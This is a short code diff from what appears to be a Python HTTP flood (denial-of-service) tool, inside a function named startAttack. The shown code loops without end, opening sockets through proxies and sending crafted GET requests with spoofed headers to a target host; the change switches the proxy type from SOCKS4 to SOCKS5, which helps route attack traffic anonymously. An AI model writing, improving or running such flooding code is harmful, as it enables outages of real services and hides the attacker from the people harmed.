@@ -39,7 +39,7 @@ def startAttack():
     headers = "GET " + path + " HTTP/1.1\r\nHost: " + host + "\r\nConnection: Keep-Alive\r\n" + accept + "\r\nUser-Agent: " + userAgent + "\r\nUpgrade-Insecure-Requests: 1\r\n\r\n"
     while True: 
         conn = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM, 0)
-        conn.set_proxy(socks.SOCKS4, proxyAddr[0], int(proxyAddr[1]))
+        conn.set_proxy(socks.SOCKS5, proxyAddr[0], int(proxyAddr[1]))
         conn.settimeout(3)
         try:
             conn.connect((host, port))
